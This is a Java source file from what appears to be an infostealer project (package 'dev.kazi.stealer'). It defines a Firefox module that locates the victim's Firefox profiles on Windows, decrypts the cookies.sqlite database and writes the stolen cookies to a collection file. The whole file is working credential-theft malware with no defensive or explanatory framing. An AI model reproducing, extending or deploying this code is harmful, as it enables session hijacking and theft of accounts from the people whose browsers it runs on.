package dev.kazi.stealer.node.nodes.impl.browser;

import dev.kazi.stealer.utils.decrypt.cookie.MozillaCookieDecrypt;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.util.Objects;
import java.io.IOException;
import java.io.File;
import dev.kazi.stealer.node.Category;
import dev.kazi.stealer.node.Node;

public class Firefox extends Node {

    public Firefox() {
        super(Category.FILE);
    }
    
    @Override
    public void createNode() {
        try {
            final File path = new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles");
            if (path.exists()) {
                this.cookie();
            }
        }
        catch (final IOException e) {
            e.printStackTrace();
        }
    }
    
    public void cookie() throws IOException {
        final String fileName = "default-release";
        final File path = new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles");
        if (path.exists()) {
            for (final File file : Objects.requireNonNull(path.listFiles())) {
                final String name = file.getName();
                if (file.getName().contains(fileName) && new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" + name).exists()) {
                    final FileWriter writer = new FileWriter(this.mergePath(this.getFolder(), "Cookies") + "\\Firefox.txt", true);
                    final BufferedWriter bufferedWriter = new BufferedWriter(writer);
                    bufferedWriter.write(new MozillaCookieDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" + name + "\\cookies.sqlite").getCookies().getData());
                    bufferedWriter.close();
                }
            }
        }
    }
}
